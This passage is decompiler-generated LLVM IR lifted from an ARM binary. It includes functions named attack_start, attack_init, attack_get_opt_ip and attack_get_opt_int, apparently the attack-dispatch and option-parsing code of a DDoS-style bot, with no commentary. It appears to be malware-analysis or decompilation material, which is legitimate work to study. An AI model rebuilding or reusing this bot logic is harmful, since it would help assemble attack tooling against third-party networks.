  %v1_83bc = add i32 %v0_83bc, 11
  store i32 %v1_83bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_83c0

dec_label_pc_83c0:                                ; preds = %dec_label_pc_83c0, %dec_label_pc_83a0
  %v1_83c4 = phi i32 [ %v1_83f0, %dec_label_pc_83c0 ], [ %v2_83ac, %dec_label_pc_83a0 ]
  %v0_83c0 = phi i32 [ %v1_83ec, %dec_label_pc_83c0 ], [ %v1_83bc, %dec_label_pc_83a0 ]
  %v1_83c0 = add i32 %v0_83c0, -5
  %v2_83c0 = inttoptr i32 %v1_83c0 to i32*
  %v3_83c0 = load i32, i32* %v2_83c0, align 4
  store i32 %v3_83c0, i32* %r1.global-to-local, align 4
  %v2_83c4 = add i32 %v1_83c4, 16
  %v3_83c4 = inttoptr i32 %v2_83c4 to i32*
  store i32 %v3_83c0, i32* %v3_83c4, align 4
  %v0_83c8 = load i32, i32* @r7, align 4
  %v1_83c8 = add i32 %v0_83c8, -6
  store i32 %v1_83c8, i32* %r3.global-to-local, align 4
  %v0_83cc = load i32, i32* %r0.global-to-local, align 4
  %v1_83cc = add i32 %v0_83cc, -1
  %v2_83cc = inttoptr i32 %v1_83cc to i8*
  %v3_83cc = load i8, i8* %v2_83cc, align 1
  %v4_83cc = zext i8 %v3_83cc to i32
  store i32 %v4_83cc, i32* %r2.global-to-local, align 4
  %v0_83d0 = load i32, i32* @r6, align 4
  %v1_83d0 = add i32 %v0_83d0, -5
  store i32 %v1_83d0, i32* @r6, align 4
  %v9_83d4 = icmp eq i32 %v1_83d0, %v1_83c8
  store i1 %v9_83d4, i1* %cpsr_z.global-to-local, align 1
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v0_83cc, i32* @r4, align 4
  %v2_83e0 = load i32, i32* %ip.global-to-local, align 4
  %v3_83e0 = add i32 %v2_83e0, 20
  %v4_83e0 = inttoptr i32 %v3_83e0 to i8*
  store i8 %v3_83cc, i8* %v4_83e0, align 1
  %v0_83e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_83e4 = load i32, i32* %ip.global-to-local, align 4
  %v2_83e4 = add i32 %v1_83e4, 4
  %v3_83e4 = inttoptr i32 %v2_83e4 to i32*
  store i32 %v0_83e4, i32* %v3_83e4, align 4
  %v0_83e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_83e8 = trunc i32 %v0_83e8 to i16
  %v2_83e8 = load i32, i32* %ip.global-to-local, align 4
  %v3_83e8 = inttoptr i32 %v2_83e8 to i16*
  store i16 %v1_83e8, i16* %v3_83e8, align 2
  %v0_83ec = load i32, i32* %r0.global-to-local, align 4
  %v1_83ec = add i32 %v0_83ec, 5
  store i32 %v1_83ec, i32* %r0.global-to-local, align 4
  %v0_83f0 = load i32, i32* %ip.global-to-local, align 4
  %v1_83f0 = add i32 %v0_83f0, 24
  store i32 %v1_83f0, i32* %ip.global-to-local, align 4
  %v0_83f4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_83f4, label %dec_label_pc_83f8, label %dec_label_pc_83c0

dec_label_pc_83f8:                                ; preds = %dec_label_pc_83c0
  %v0_83f8 = load i32, i32* @r6, align 4
  %v2_83f8 = icmp eq i32 %v0_83f8, 0
  store i1 %v2_83f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_83f8, label %dec_label_pc_84fc, label %dec_label_pc_8400

dec_label_pc_8400:                                ; preds = %dec_label_pc_83f8
  %v0_8400 = load i32, i32* @r4, align 4
  %v1_8400 = inttoptr i32 %v0_8400 to i8*
  %v2_8400 = load i8, i8* %v1_8400, align 1
  %v3_8400 = zext i8 %v2_8400 to i32
  store i32 %v3_8400, i32* @r5, align 4
  %v2_8404 = icmp eq i8 %v2_8400, 0
  store i1 %v2_8404, i1* %cpsr_z.global-to-local, align 1
  %v0_8408 = load i32, i32* @r7, align 4
  %v1_8408 = add i32 %v0_8408, -7
  store i32 %v1_8408, i32* @r8, align 4
  br i1 %v2_8404, label %bb, label %dec_label_pc_8414

bb:                                               ; preds = %dec_label_pc_8400
  store i32 %v3_8400, i32* @r6, align 4
  br label %dec_label_pc_84d8

dec_label_pc_8414:                                ; preds = %dec_label_pc_8400
  store i32 %v3_8400, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_841c = call i32 @calloc(i32 %v3_8400, i32 8)
  store i32 %v2_841c, i32* %r0.global-to-local, align 4
  %v0_8420 = load i32, i32* @r8, align 4
  %v2_8420 = icmp eq i32 %v0_8420, 0
  store i1 %v2_8420, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_841c, i32* @r6, align 4
  br i1 %v2_8420, label %dec_label_pc_84fc, label %dec_label_pc_842c

dec_label_pc_842c:                                ; preds = %dec_label_pc_8414
  %v0_842c = load i32, i32* @r4, align 4
  %v1_842c = add i32 %v0_842c, 1
  %v2_842c = inttoptr i32 %v1_842c to i8*
  %v3_842c = load i8, i8* %v2_842c, align 1
  %v0_8430 = load i32, i32* @r7, align 4
  %v7_8430 = icmp eq i32 %v0_8430, 8
  store i1 %v7_8430, i1* %cpsr_z.global-to-local, align 1
  %v3_8434 = add i32 %v2_841c, 4
  %v4_8434 = inttoptr i32 %v3_8434 to i8*
  store i8 %v3_842c, i8* %v4_8434, align 1
  %v0_8438 = load i32, i32* @r4, align 4
  %v1_8438 = add i32 %v0_8438, 1
  store i32 %v1_8438, i32* %r3.global-to-local, align 4
  %v0_843c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_843c, label %dec_label_pc_84fc, label %dec_label_pc_8440

dec_label_pc_8440:                                ; preds = %dec_label_pc_842c
  %v1_8440 = add i32 %v0_8438, 2
  %v2_8440 = inttoptr i32 %v1_8440 to i8*
  %v3_8440 = load i8, i8* %v2_8440, align 1
  %v4_8440 = zext i8 %v3_8440 to i32
  store i32 %v4_8440, i32* @r4, align 4
  %v0_8444 = load i32, i32* @r7, align 4
  %v1_8444 = add i32 %v0_8444, -9
  store i32 %v1_8444, i32* @r8, align 4
  %v9_8448 = icmp eq i32 %v1_8444, %v4_8440
  store i1 %v9_8448, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8440, i32* %r1.global-to-local, align 4
  %v5_8450 = icmp slt i32 %v1_8444, %v4_8440
  br i1 %v5_8450, label %dec_label_pc_84fc, label %bb35

bb35:                                             ; preds = %dec_label_pc_8440
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_84547 = add i32 %v0_8438, 3
  store i32 %v7_84547, i32* @r7, align 4
  %v6_8458 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v6_8458, i32* @sl, align 4
  br label %dec_label_pc_849c

dec_label_pc_8468:                                ; preds = %dec_label_pc_849c
  %v0_8468 = load i32, i32* @r8, align 4
  %v1_8468 = load i32, i32* @r4, align 4
  %v2_8468 = sub i32 %v0_8468, %v1_8468
  store i32 %v2_8468, i32* %r2.global-to-local, align 4
  %v9_8468 = icmp eq i32 %v0_8468, %v1_8468
  store i1 %v9_8468, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8468, label %dec_label_pc_84fc, label %dec_label_pc_8470

dec_label_pc_8470:                                ; preds = %dec_label_pc_8468
  %v1_8470 = load i32, i32* @r7, align 4
  %v2_8470 = add i32 %v1_8470, %v1_8468
  %v3_8470 = inttoptr i32 %v2_8470 to i8*
  %v4_8470 = load i8, i8* %v3_8470, align 1
  store i32 %v2_8470, i32* %r0.global-to-local, align 4
  %v1_8478 = add i32 %v2_8468, -1
  store i32 %v1_8478, i32* %r2.global-to-local, align 4
  %v7_8478 = icmp eq i32 %v2_8468, 1
  store i1 %v7_8478, i1* %cpsr_z.global-to-local, align 1
  %v3_847c = add i32 %v2_84d0, 4
  %v4_847c = inttoptr i32 %v3_847c to i8*
  store i8 %v4_8470, i8* %v4_847c, align 1
  %v0_8480 = load i32, i32* %r0.global-to-local, align 4
  %v1_8480 = add i32 %v0_8480, 1
  store i32 %v1_8480, i32* %r3.global-to-local, align 4
  %v0_8484 = load i32, i32* %r2.global-to-local, align 4
  %v1_8484 = add i32 %v0_8484, -1
  store i32 %v1_8484, i32* @r8, align 4
  %v1_8488 = add i32 %v0_8480, 2
  store i32 %v1_8488, i32* @r7, align 4
  %v0_848c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_848c, label %dec_label_pc_84fc, label %dec_label_pc_8490

dec_label_pc_8490:                                ; preds = %dec_label_pc_8470
  %v2_8490 = inttoptr i32 %v1_8480 to i8*
  %v3_8490 = load i8, i8* %v2_8490, align 1
  %v4_8490 = zext i8 %v3_8490 to i32
  store i32 %v4_8490, i32* @r4, align 4
  %v2_8494 = sub i32 %v1_8484, %v4_8490
  %tmp36 = sub i32 0, %v2_8494
  %v6_8494 = and i32 %v1_8484, %tmp36
  %v7_8494 = icmp slt i32 %v6_8494, 0
  %v8_8494 = icmp slt i32 %v2_8494, 0
  %v9_8494 = icmp eq i32 %v1_8484, %v4_8490
  store i1 %v9_8494, i1* %cpsr_z.global-to-local, align 1
  %v2_8498 = xor i1 %v8_8494, %v7_8494
  br i1 %v2_8498, label %dec_label_pc_84fc, label %dec_label_pc_849c

dec_label_pc_849c:                                ; preds = %bb35, %dec_label_pc_8490
  %v0_84a0 = phi i32 [ %v4_8440, %bb35 ], [ %v4_8490, %dec_label_pc_8490 ]
  %stack_var_-48.1 = phi i32 [ 0, %bb35 ], [ %v1_84b0, %dec_label_pc_8490 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_84a0 = add nuw nsw i32 %v0_84a0, 1
  store i32 %v1_84a0, i32* %r0.global-to-local, align 4
  %v2_84a4 = call i32 @calloc(i32 %v1_84a0, i32 1)
  store i32 %v2_84a4, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-48.1, i32* %r3.global-to-local, align 4
  %v1_84ac = load i32, i32* @sl, align 4
  %v2_84ac = inttoptr i32 %v1_84ac to i32*
  store i32 %v2_84a4, i32* %v2_84ac, align 4
  %v0_84b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_84b0 = add i32 %v0_84b0, 1
  store i32 %v1_84b0, i32* %r3.global-to-local, align 4
  %v0_84b4 = load i32, i32* @r4, align 4
  store i32 %v0_84b4, i32* %r2.global-to-local, align 4
  %v0_84b8 = load i32, i32* @r7, align 4
  store i32 %v0_84b8, i32* %r1.global-to-local, align 4
  %v3_84c0 = call i32 @util_memcpy(i32 %v2_84a4, i32 %v0_84b8, i32 %v0_84b4)
  store i32 %v3_84c0, i32* %r0.global-to-local, align 4
  store i32 %v1_84b0, i32* %r2.global-to-local, align 4
  %v3_84c8 = mul i32 %v1_84b0, 8
  store i32 %v3_84c8, i32* %r3.global-to-local, align 4
  %v1_84cc = load i32, i32* @r5, align 4
  %v9_84cc = icmp eq i32 %v1_84b0, %v1_84cc
  store i1 %v9_84cc, i1* %cpsr_z.global-to-local, align 1
  %v0_84d0 = load i32, i32* @r6, align 4
  %v2_84d0 = add i32 %v0_84d0, %v3_84c8
  store i32 %v2_84d0, i32* @sl, align 4
  br i1 %v9_84cc, label %dec_label_pc_84d8, label %dec_label_pc_8468

dec_label_pc_84d8:                                ; preds = %dec_label_pc_849c, %bb
  %v0_84d8 = call i32 @__GI___errno_location()
  %v2_84e0 = inttoptr i32 %v0_84d8 to i32*
  store i32 0, i32* %v2_84e0, align 4
  store i32 %v4_8370, i32* %r1.global-to-local, align 4
  %v0_84e8 = load i32, i32* @fp, align 4
  store i32 %v0_84e8, i32* %r0.global-to-local, align 4
  %v0_84ec = load i32, i32* @sb, align 4
  store i32 %v0_84ec, i32* %r2.global-to-local, align 4
  store i32 %v2_83ac, i32* %r3.global-to-local, align 4
  %v2_84f4 = load i32, i32* @r5, align 4
  %v5_84f4 = load i32, i32* @r6, align 4
  %v6_84f8 = trunc i32 %v2_84f4 to i8
  %v7_84f8 = call i32 @attack_start(i32 %v0_84e8, i32 %v4_8370, i32 %v0_84ec, i32 %v2_83ac, i8 %v6_84f8, i32 %v5_84f4)
  store i32 %v7_84f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_84fc

dec_label_pc_84fc:                                ; preds = %dec_label_pc_8490, %dec_label_pc_8470, %dec_label_pc_8468, %dec_label_pc_8440, %dec_label_pc_842c, %dec_label_pc_8414, %dec_label_pc_83f8, %dec_label_pc_84d8
  store i32 %v2_83ac, i32* %r3.global-to-local, align 4
  %v2_8500 = icmp eq i32 %v2_83ac, 0
  store i1 %v2_8500, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8500, label %bb38, label %bb37

bb37:                                             ; preds = %dec_label_pc_84fc
  store i32 %v2_83ac, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_84fc, %bb37
  store i32 34060, i32* @lr, align 4
  %v1_8508 = xor i1 %v2_8500, true
  call void @__pseudo_cond_branch(i1 %v1_8508, i32 ptrtoint (i32* @global_var_131f4.32 to i32))
  %v0_850c = load i32, i32* @r6, align 4
  %v2_850c = icmp eq i32 %v0_850c, 0
  store i1 %v2_850c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_850c, label %.dec_label_pc_8340_crit_edge, label %dec_label_pc_8514

.dec_label_pc_8340_crit_edge:                     ; preds = %bb38
  %v1_8348.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8340

dec_label_pc_8514:                                ; preds = %bb38
  %v0_8514 = load i32, i32* @r5, align 4
  %v2_8514 = icmp eq i32 %v0_8514, 0
  store i1 %v2_8514, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8514, label %dec_label_pc_8538, label %dec_label_pc_851c

dec_label_pc_851c:                                ; preds = %dec_label_pc_8514
  br label %dec_label_pc_8520

dec_label_pc_8520:                                ; preds = %dec_label_pc_8520, %dec_label_pc_851c
  %v0_8528 = phi i32 [ 0, %dec_label_pc_851c ], [ %v1_8530, %dec_label_pc_8520 ]
  %v0_8520 = phi i32 [ %v0_850c, %dec_label_pc_851c ], [ %v0_8538.pre, %dec_label_pc_8520 ]
  %v4_8520 = mul i32 %v0_8528, 8
  %v5_8520 = add i32 %v4_8520, %v0_8520
  %v6_8520 = inttoptr i32 %v5_8520 to i32*
  %v7_8520 = load i32, i32* %v6_8520, align 4
  store i32 %v7_8520, i32* %r0.global-to-local, align 4
  %v2_8524 = icmp eq i32 %v7_8520, 0
  store i1 %v2_8524, i1* %cpsr_z.global-to-local, align 1
  %v1_8528 = add i32 %v0_8528, 1
  store i32 %v1_8528, i32* @r4, align 4
  store i32 34096, i32* @lr, align 4
  %v1_852c = xor i1 %v2_8524, true
  call void @__pseudo_cond_branch(i1 %v1_852c, i32 ptrtoint (i32* @global_var_131f4.32 to i32))
  %v0_8530 = load i32, i32* @r5, align 4
  %v1_8530 = load i32, i32* @r4, align 4
  %v9_8530 = icmp eq i32 %v0_8530, %v1_8530
  store i1 %v9_8530, i1* %cpsr_z.global-to-local, align 1
  %v0_8538.pre = load i32, i32* @r6, align 4
  br i1 %v9_8530, label %dec_label_pc_8538, label %dec_label_pc_8520

dec_label_pc_8538:                                ; preds = %dec_label_pc_8520, %dec_label_pc_8514
  %v0_8538 = phi i32 [ %v0_850c, %dec_label_pc_8514 ], [ %v0_8538.pre, %dec_label_pc_8520 ]
  store i32 %v0_8538, i32* @r0, align 4
  %v0_853c = call i32 @free()
  store i32 %v0_853c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8340

; uselistorder directives
  uselistorder i32 %v0_853c, { 1, 0 }
  uselistorder i32 %v1_8530, { 1, 0 }
  uselistorder i1 %v2_8500, { 0, 2, 1 }
  uselistorder i32 %v2_84d0, { 1, 0 }
  uselistorder i32 %v3_84c8, { 1, 0 }
  uselistorder i32 %v1_84b0, { 3, 0, 2, 4, 1 }
  uselistorder i32 %v2_8494, { 1, 0 }
  uselistorder i32 %v4_8490, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8484, { 2, 0, 1, 3 }
  uselistorder i32 %v3_8400, { 1, 0, 2, 3 }
  uselistorder i32 %v1_83f0, { 1, 0 }
  uselistorder i32 %v1_83ec, { 1, 0 }
  uselistorder i32 %v2_83ac, { 0, 4, 5, 2, 3, 1, 6 }
  uselistorder i32 %v4_8380, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8350, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v2_834c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_8338, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 4, 5, 6, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 6, 2, 3, 4, 0, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 17, 3, 6, 5, 9, 11, 10, 7, 8, 18, 19, 12, 13, 14, 15, 16, 20, 21, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_84fc, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_849c, { 1, 0 }
  uselistorder label %dec_label_pc_8340, { 6, 1, 0, 2, 3, 4, 5 }
}

define i32 @attack_get_opt_ip(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_8544 = icmp eq i32 %arg1, 0
  %v3_8548 = load i32, i32* @r4, align 4
  store i32 %v3_8548, i32* %stack_var_-8, align 4
  %v6_8548 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* @r4, align 4
  br i1 %v2_8544, label %dec_label_pc_858c, label %dec_label_pc_8554

dec_label_pc_8554:                                ; preds = %entry
  %v0_8554 = load i32, i32* %r1.global-to-local, align 4
  %v1_8554 = add i32 %v0_8554, 4
  %v2_8554 = inttoptr i32 %v1_8554 to i8*
  %v3_8554 = load i8, i8* %v2_8554, align 1
  %v4_8554 = zext i8 %v3_8554 to i32
  %v9_8558 = icmp eq i32 %v4_8554, %arg3
  br i1 %v9_8558, label %dec_label_pc_8598, label %dec_label_pc_857c.preheader

dec_label_pc_857c.preheader:                      ; preds = %dec_label_pc_8554
  br label %dec_label_pc_857c

dec_label_pc_856c:                                ; preds = %dec_label_pc_857c
  %v1_856c = add i32 %v0_8574.in, 12
  %v2_856c = inttoptr i32 %v1_856c to i8*
  %v3_856c = load i8, i8* %v2_856c, align 1
  %v4_856c = zext i8 %v3_856c to i32
  %v9_8570 = icmp eq i32 %v4_856c, %arg3
  br i1 %v9_8570, label %dec_label_pc_8598, label %dec_label_pc_857c

dec_label_pc_857c:                                ; preds = %dec_label_pc_857c.preheader, %dec_label_pc_856c
  %v0_8574.in = phi i32 [ %v0_8554, %dec_label_pc_857c.preheader ], [ %v0_8574, %dec_label_pc_856c ]
  %v0_857c = phi i32 [ 0, %dec_label_pc_857c.preheader ], [ %v1_857c, %dec_label_pc_856c ]
  %v0_8574 = add i32 %v0_8574.in, 8
  %v1_857c = add i32 %v0_857c, 1
  %v9_8580 = icmp eq i32 %v1_857c, %arg1
  store i32 %v0_8574, i32* %r1.global-to-local, align 4
  br i1 %v9_8580, label %dec_label_pc_858c, label %dec_label_pc_856c

dec_label_pc_858c:                                ; preds = %dec_label_pc_857c, %dec_label_pc_8598, %entry, %dec_label_pc_85a4
  %v2_8590 = phi i32 [ %v3_8548, %dec_label_pc_8598 ], [ %v3_8548, %entry ], [ %v2_8590.pre, %dec_label_pc_85a4 ], [ %v3_8548, %dec_label_pc_857c ]
  %v0_858c = phi i32 [ %arg4, %dec_label_pc_8598 ], [ %arg4, %entry ], [ %v1_85a4, %dec_label_pc_85a4 ], [ %arg4, %dec_label_pc_857c ]
  store i32 %v2_8590, i32* @r4, align 4
  store i32 %v6_8548, i32* @lr, align 4
  ret i32 %v0_858c

dec_label_pc_8598:                                ; preds = %dec_label_pc_856c, %dec_label_pc_8554
  %v0_8598 = phi i32 [ %v0_8554, %dec_label_pc_8554 ], [ %v0_8574, %dec_label_pc_856c ]
  %v1_8598 = inttoptr i32 %v0_8598 to i32*
  %v2_8598 = load i32, i32* %v1_8598, align 4
  store i32 %v2_8598, i32* @r0, align 4
  %v2_859c = icmp eq i32 %v2_8598, 0
  br i1 %v2_859c, label %dec_label_pc_858c, label %dec_label_pc_85a4

dec_label_pc_85a4:                                ; preds = %dec_label_pc_8598
  %v1_85a4 = call i32 @inet_addr(i32 %v2_8598)
  %v2_8590.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_858c

; uselistorder directives
  uselistorder i32 %v1_857c, { 1, 0 }
  uselistorder i32 %v0_8574, { 1, 0, 2 }
  uselistorder i32 %v0_8574.in, { 1, 0 }
  uselistorder i32 %v0_8554, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_858c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_857c, { 1, 0 }
}

define i32 @attack_get_opt_int(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_85b0 = icmp eq i32 %arg1, 0
  %v3_85b4 = load i32, i32* @r4, align 4
  store i32 %v3_85b4, i32* %stack_var_-8, align 4
  %v6_85b4 = load i32, i32* @lr, align 4
  br i1 %v2_85b0, label %dec_label_pc_85f8, label %dec_label_pc_85c0

dec_label_pc_85c0:                                ; preds = %entry
  %v0_85c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_85c0 = add i32 %v0_85c0, 4
  %v2_85c0 = inttoptr i32 %v1_85c0 to i8*
  %v3_85c0 = load i8, i8* %v2_85c0, align 1
  %v4_85c0 = zext i8 %v3_85c0 to i32
  %v9_85c4 = icmp eq i32 %v4_85c0, %arg3
  br i1 %v9_85c4, label %dec_label_pc_8604, label %dec_label_pc_85e8.preheader

dec_label_pc_85e8.preheader:                      ; preds = %dec_label_pc_85c0
  br label %dec_label_pc_85e8

dec_label_pc_85d8:                                ; preds = %dec_label_pc_85e8
  %v1_85d8 = add i32 %v0_85e0.in, 12
  %v2_85d8 = inttoptr i32 %v1_85d8 to i8*
  %v3_85d8 = load i8, i8* %v2_85d8, align 1
  %v4_85d8 = zext i8 %v3_85d8 to i32
  %v9_85dc = icmp eq i32 %v4_85d8, %arg3
  br i1 %v9_85dc, label %dec_label_pc_8604, label %dec_label_pc_85e8

dec_label_pc_85e8:                                ; preds = %dec_label_pc_85e8.preheader, %dec_label_pc_85d8
  %v0_85e0.in = phi i32 [ %v0_85c0, %dec_label_pc_85e8.preheader ], [ %v0_85e0, %dec_label_pc_85d8 ]
  %v0_85e8 = phi i32 [ 0, %dec_label_pc_85e8.preheader ], [ %v1_85e8, %dec_label_pc_85d8 ]
  %v0_85e0 = add i32 %v0_85e0.in, 8
  %v1_85e8 = add i32 %v0_85e8, 1
  %v9_85ec = icmp eq i32 %v1_85e8, %arg1
  store i32 %v0_85e0, i32* %r1.global-to-local, align 4
  br i1 %v9_85ec, label %dec_label_pc_85f8, label %dec_label_pc_85d8

dec_label_pc_85f8:                                ; preds = %dec_label_pc_85e8, %dec_label_pc_8604, %entry, %dec_label_pc_8610
  %v2_85fc = phi i32 [ %v3_85b4, %dec_label_pc_8604 ], [ %v3_85b4, %entry ], [ %v2_85fc.pre, %dec_label_pc_8610 ], [ %v3_85b4, %dec_label_pc_85e8 ]
  %v0_85f8 = phi i32 [ %arg4, %dec_label_pc_8604 ], [ %arg4, %entry ], [ %v3_8614, %dec_label_pc_8610 ], [ %arg4, %dec_label_pc_85e8 ]
  store i32 %v2_85fc, i32* @r4, align 4
  store i32 %v6_85b4, i32* @lr, align 4
  ret i32 %v0_85f8

dec_label_pc_8604:                                ; preds = %dec_label_pc_85d8, %dec_label_pc_85c0
  %v0_8604 = phi i32 [ %v0_85c0, %dec_label_pc_85c0 ], [ %v0_85e0, %dec_label_pc_85d8 ]
  %v1_8604 = inttoptr i32 %v0_8604 to i32*
  %v2_8604 = load i32, i32* %v1_8604, align 4
  %v2_8608 = icmp eq i32 %v2_8604, 0
  br i1 %v2_8608, label %dec_label_pc_85f8, label %dec_label_pc_8610

dec_label_pc_8610:                                ; preds = %dec_label_pc_8604
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_8614 = inttoptr i32 %v2_8604 to i8*
  %v3_8614 = call i32 @util_atoi(i8* %v2_8614, i32 10)
  %v2_85fc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_85f8

; uselistorder directives
  uselistorder i32 %v1_85e8, { 1, 0 }
  uselistorder i32 %v0_85e0, { 1, 0, 2 }
  uselistorder i32 %v0_85e0.in, { 1, 0 }
  uselistorder i32 %v0_85c0, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_85f8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_85e8, { 1, 0 }
}

define i32 @attack_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_8620 = load i32, i32* @r4, align 4
  store i32 %v3_8620, i32* %stack_var_-24, align 4
  %v6_8620 = load i32, i32* @r5, align 4
  %v9_8620 = load i32, i32* @r6, align 4
  %v12_8620 = load i32, i32* @r7, align 4
  %v15_8620 = load i32, i32* @r8, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_862c = call i32 @calloc(i32 1, i32 8)
  store i32 ptrtoint (i8** @global_var_2222c.28 to i32), i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_22230.30 to i32), i32* @r6, align 4
  store i32 36588, i32* %r2.global-to-local, align 4
  store i32 %v2_862c, i32* @r5, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_2222d.36 to i32), i32* %r1.global-to-local, align 4
  %v2_864c = load i32, i32* @global_var_22230.30, align 4
  %v2_8650 = inttoptr i32 %v2_862c to i32*
  store i32 36588, i32* %v2_8650, align 4
  %v3_8654 = load i32, i32* @r5, align 4
  %v4_8654 = add i32 %v3_8654, 4
  %v5_8654 = inttoptr i32 %v4_8654 to i8*
  store i8 0, i8* %v5_8654, align 1
  %v0_8658 = load i32, i32* %r1.global-to-local, align 4
  %v3_8658 = mul i32 %v0_8658, 4
  store i32 %v3_8658, i32* %r1.global-to-local, align 4
  %v5_865c = inttoptr i32 %v2_864c to i32*
  %v6_865c = call i32 @realloc(i32* %v5_865c, i32 %v3_8658, i32 36588, i32 0)
  %v2_8660 = load i8, i8* bitcast (i8** @global_var_2222c.28 to i8*), align 4
  %v3_8660 = zext i8 %v2_8660 to i32
  store i32 %v6_865c, i32* %r2.global-to-local, align 4
  %v0_8668 = load i32, i32* @r5, align 4
  %v5_8668 = mul nuw nsw i32 %v3_8660, 4
  %v6_8668 = add i32 %v5_8668, %v6_865c
  %v7_8668 = inttoptr i32 %v6_8668 to i32*
  store i32 %v0_8668, i32* %v7_8668, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_2222d.36 to i32), i32* %r3.global-to-local, align 4
  %v1_8678 = load i32, i32* @r6, align 4
  %v2_8678 = inttoptr i32 %v1_8678 to i32*
  store i32 %v6_865c, i32* %v2_8678, align 4
  %v0_867c = load i32, i32* %r3.global-to-local, align 4
  %v1_867c = trunc i32 %v0_867c to i8
  %v2_867c = load i32, i32* @r4, align 4
  %v3_867c = inttoptr i32 %v2_867c to i8*
  store i8 %v1_867c, i8* %v3_867c, align 1
  %v2_8680 = call i32 @calloc(i32 1, i32 8)
  store i32 ptrtoint (i32* @global_var_a088.38 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* @r8, align 4
  store i32 %v2_8680, i32* @r5, align 4
  store i32 ptrtoint (i8* @global_var_2222d.36 to i32), i32* %r1.global-to-local, align 4
  %v2_8698 = load i32, i32* @global_var_22230.30, align 4
  %v2_869c = inttoptr i32 %v2_8680 to i32*
  store i32 ptrtoint (i32* @global_var_a088.38 to i32), i32* %v2_869c, align 4
  %v0_86a0 = load i32, i32* @r8, align 4
  %v1_86a0 = trunc i32 %v0_86a0 to i8
  %v2_86a0 = load i32, i32* @r5, align 4
  %v3_86a0 = add i32 %v2_86a0, 4
  %v4_86a0 = inttoptr i32 %v3_86a0 to i8*
  store i8 %v1_86a0, i8* %v4_86a0, align 1
  %v0_86a4 = load i32, i32* %r1.global-to-local, align 4
  %v3_86a4 = mul i32 %v0_86a4, 4
  store i32 %v3_86a4, i32* %r1.global-to-local, align 4
  %v4_86a8 = inttoptr i32 %v2_8698 to i32*
  %v5_86a8 = call i32 @realloc(i32* %v4_86a8, i32 %v3_86a4, i32 %v6_865c, i32 ptrtoint (i32* @global_var_a088.38 to i32))
  %v2_86ac = load i8, i8* bitcast (i8** @global_var_2222c.28 to i8*), align 4
  %v3_86ac = zext i8 %v2_86ac to i32
  store i32 %v3_86ac, i32* %r3.global-to-local, align 4
  store i32 %v5_86a8, i32* %r2.global-to-local, align 4
  %v0_86b4 = load i32, i32* @r5, align 4
